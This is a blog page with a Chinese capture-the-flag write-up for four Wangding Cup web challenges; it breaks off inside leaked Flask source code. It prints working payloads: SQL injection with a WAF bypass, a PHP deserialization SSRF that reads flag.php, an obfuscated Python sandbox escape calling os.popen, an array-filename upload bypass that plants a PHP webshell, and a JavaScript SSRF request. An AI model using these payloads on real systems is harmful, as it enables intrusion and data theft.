@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00 fakebook题目页面是这样的大概就是先join一个用户，然后再点进去看具体信息,可以看到blog的内容。这题我一开始以为是join那里有个时间盲注，因为我在username那里用了这样的payload，是成功了的：adzzzzmin&amp;#39; or if((1=1),sleep(10),0)#，但是后面发现，并不能注出什么东西出来。">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="website">
+<meta property="og:title" content="网鼎杯WEB_writeup">
+<meta property="og:url" content="http://yoursite.com/网鼎杯WEB-writeup.html">
+<meta property="og:site_name" content="C0mRaDe&#39;s Blog">
+<meta property="og:description" content="0x00 fakebook题目页面是这样的大概就是先join一个用户，然后再点进去看具体信息,可以看到blog的内容。这题我一开始以为是join那里有个时间盲注，因为我在username那里用了这样的payload，是成功了的：adzzzzmin&amp;#39; or if((1=1),sleep(10),0)#，但是后面发现，并不能注出什么东西出来。">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/10.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/12.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/13.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/14.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/78.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/15.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/16.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/18.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/19.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/20.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/21.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/22.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/23.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/31.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/33.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/34.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/35.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/36.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/37.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/38.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/24.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/25.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/27.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/28.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/30.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/29.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/42.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/40.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/41.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/43.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/44.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/45.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/46.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/47.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/49.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/50.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/52.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/53.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/55.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/56.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/57.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/61.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/62.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/59.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/58.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/63.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/64.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/69.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/70.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/72.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/73.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/74.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/75.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/76.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/77.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/65.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/66.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/67.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/68.png">
+<meta property="og:updated_time" content="2018-09-20T11:03:55.459Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="网鼎杯WEB_writeup">
+<meta name="twitter:description" content="0x00 fakebook题目页面是这样的大概就是先join一个用户，然后再点进去看具体信息,可以看到blog的内容。这题我一开始以为是join那里有个时间盲注，因为我在username那里用了这样的payload，是成功了的：adzzzzmin&amp;#39; or if((1=1),sleep(10),0)#，但是后面发现，并不能注出什么东西出来。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/网鼎杯WEB-writeup.html"/>
+
+
+
+
+
+  <title>网鼎杯WEB_writeup | C0mRaDe's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0mRaDe's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">大学生的酸腐和矫情是这世界上最没用的东西.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            歸檔
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
+
+	<h1 class="post-title" itemprop="name headline">网鼎杯WEB_writeup</h1>
+
+
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <h2 id="0x00-fakebook"><a href="#0x00-fakebook" class="headerlink" title="0x00 fakebook"></a>0x00 fakebook</h2><p>题目页面是这样的<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/1.png" alt="image">大概就是先join一个用户，然后再点进去看具体信息,可以看到blog的内容。这题我一开始以为是join那里有个时间盲注，因为我在username那里用了这样的payload，是成功了的：<code>adzzzzmin&#39; or if((1=1),sleep(10),0)#</code>，但是后面发现，并不能注出什么东西出来。<a id="more"></a><br>正解如下：在具体信息页面(view.php)no参数存在注入，<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/2.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/3.png" alt="image">注出来有4列，第二列有回显<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/4.png" alt="image">，然后，常规操作，<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/5.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/6.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/7.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/8.png" alt="image">注意要用<code>/**/</code>绕过对union select的waf。<br>注出data列的内容是一串php的序列化数据，想到构造序列化的数据去ssrf读取flag.php(之所以知道是flag.php，是因为可以试出来)，构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=1 and 1=2 union/**/select 1,2,3,&apos;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;aaa&quot;;s:3:&quot;age&quot;;i:11;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&apos;</span><br></pre></td></tr></table></figure></p>
+<p>这样，flag的内容就会在本来显示blog内容的地方显示出来。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/9.png" alt="image">这题其实算是比较友好的web题了，当时最后一个小时才看到，而且一开始以为是时间盲注，浪费了时间，可惜了。</p>
+<h2 id="0x01-calc"><a href="#0x01-calc" class="headerlink" title="0x01 calc"></a>0x01 calc</h2><p>进来之后，发现是一个计算器<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/10.png" alt="image">给了个正则，一开始没发现有什么问题，后面才看到，这正则没有结束符。。只要开头跟正则匹配了就ok，也就是说，可以构造一个1+1+任何东西，然后，乱输url，发现后台是python写的<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/11.png" alt="image">自然想到沙箱逃逸。题目过滤了ls，稍微绕过就可以，另外，因为要和数字进行运算，所以沙箱逃逸返回的必须是数字类型，可以先编码成16进制，然后再用int函数转化为数字类型。用这个payload列目录：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>+<span class="number">1</span>+int(([].__getattribute__(<span class="string">'__cla'</span>+<span class="string">'ss__'</span>).__base__.__getattribute__([].__getattribute__(<span class="string">'__cla'</span>+<span class="string">'ss__'</span>).__base__,<span class="string">'__subclas'</span>+<span class="string">'ses__'</span>)()[<span class="number">71</span>].__dict__[<span class="string">"__in"</span>+<span class="string">"it__"</span>].__getattribute__(<span class="string">"__global"</span>+<span class="string">"s__"</span>)[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'po'</span>+<span class="string">'pen'</span>](<span class="string">'l'</span>+<span class="string">'s /'</span>).__getattribute__(<span class="string">'re'</span>+<span class="string">'ad'</span>)()).encode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/12.png" alt="image"><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/13.png" alt="image"><br>可以看到，flag就在/flag，改一下payload读flag即可。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/14.png" alt="image"></p>
+<h2 id="0x02-wafUpload"><a href="#0x02-wafUpload" class="headerlink" title="0x02 wafUpload"></a>0x02 wafUpload</h2><p>题目页面如下：<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/78.png" alt="image">给了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sandbox = <span class="string">'/var/www/html/upload/'</span> . md5(<span class="string">"phpIsBest"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="comment">#mime check</span></span><br><span class="line">    <span class="keyword">if</span> (!in_array($_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>], [<span class="string">'image/jpeg'</span>, <span class="string">'image/png'</span>, <span class="string">'image/gif'</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This type is not allowed!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#check filename</span></span><br><span class="line">    $file = <span class="keyword">empty</span>($_POST[<span class="string">'filename'</span>]) ? $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">        $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = end($file);</span><br><span class="line">    <span class="keyword">if</span> (!in_array($ext, [<span class="string">'jpg'</span>, <span class="string">'png'</span>, <span class="string">'gif'</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This file is not allowed!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $sandbox . <span class="string">'/'</span> . $filename)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Success!'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'filepath:'</span> . $sandbox . <span class="string">'/'</span> . $filename;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Failed!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Upload Your Shell&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;Filename:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"filename"</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>看了几遍，发现文件后缀的检测很难绕过去，要求后缀是jpg,png,gif三个其中一个。在这里，我们可以构造一个数组，<code>filename[2]=jpg,filename[1]=php</code><br>,这样可以绕过对<code>end($file)</code>的检查，在最后的<code>$filename = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>处，由于数组有两个元素，所以后缀会变成file[1]，也就是php，最后生成的文件名就是php.php 。payload如下：<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/15.png" alt="image">上传就成功了。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/16.png" alt="image">蚁剑连上找到flag即可。<br>另外提一下，end函数取的并不是下标最大的那个元素，而是数组里最后的那个元素，比如这段代码，<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/18.png" alt="image">输出的是xxx。其实理解好php数组本质就可以了。</p>
+<h2 id="0x03-spider"><a href="#0x03-spider" class="headerlink" title="0x03 spider"></a>0x03 spider</h2><p>这题是教育组的一道web题，到最后也还是零解，<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/19.png" alt="image">首先看看robots.txt，发现有东西<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/20.png" alt="image">首页的爬虫分析系统会执行js代码，加上这里会输出a标签的innerHTML，所以可以用js去改变a标签的内容，这里可以想到用XMLHttpRequest来SSRF<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"flag"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">function go()&#123;</span></span><br><span class="line"><span class="undefined">	var xmlhttp;</span></span><br><span class="line"><span class="undefined">	if(window.XMLHttpRequest)&#123;</span></span><br><span class="line"><span class="undefined">		xmlhttp=new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined">	else&#123;</span></span><br><span class="line"><span class="undefined">		xmlhttp=new ActiveXObject('Microsoft.XMLHTTP');</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined">	xmlhttp.onreadystatechange=function()&#123;</span></span><br><span class="line"><span class="undefined">		if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)&#123;</span></span><br><span class="line"><span class="undefined">			document.getElementById('flag').innerHTML=xmlhttp.responseText;</span></span><br><span class="line"><span class="undefined">		&#125;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined">	xmlhttp.open('GET','http://127.0.0.1/get_sourcecode',true);</span></span><br><span class="line"><span class="undefined">	xmlhttp.send();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">go();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>得到get_sourcecode给的源码<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/wangding/21.png" alt="image"><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__ , static_url_path=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proc_shell</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    out_temp = tempfile.SpooledTemporaryFile(bufsize=<span class="number">1000</span>*<span class="number">1000</span>)</span><br><span class="line">    fileno = out_temp.fileno()</span><br><span class="line">    proc = subprocess.Popen(cmd, stderr=subprocess.PIPE, stdout=fileno, shell=<span class="keyword">False</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> proc.poll() == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> time.time() - start_time &amp;gt; <span class="number">30</span>:</span><br><span class="line">                proc.terminate()</span><br><span class="line">                proc.kill()</span><br><span class="line">                proc.communicate()</span><br><span class="line">                out_temp.seek(<span class="number">0</span>)</span><br><span class="line">                out_temp.close()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            proc.communicate()</span><br><span class="line">            out_temp.seek(<span class="number">0</span>)</span><br><span class="line">            data = out_temp.read()</span><br><span class="line">            out_temp.close()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">casperjs_html</span><span class="params">(url)</span>:</span></span><br><span class="line">    cmd = <span class="string">'casperjs &#123;0&#125; --ignore-ssl-errors=yes --url=&#123;1&#125;'</span>.format(os.path.dirname(__file__) + <span class="string">'/casper/casp.js'</span> ,url)</span><br><span class="line">    cmd = cmd.split(<span class="string">' '</span>)</span><br><span class="line">    stdout = proc_shell(cmd)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = json.loads(stdout)</span><br><span class="line">        links = result.get(<span 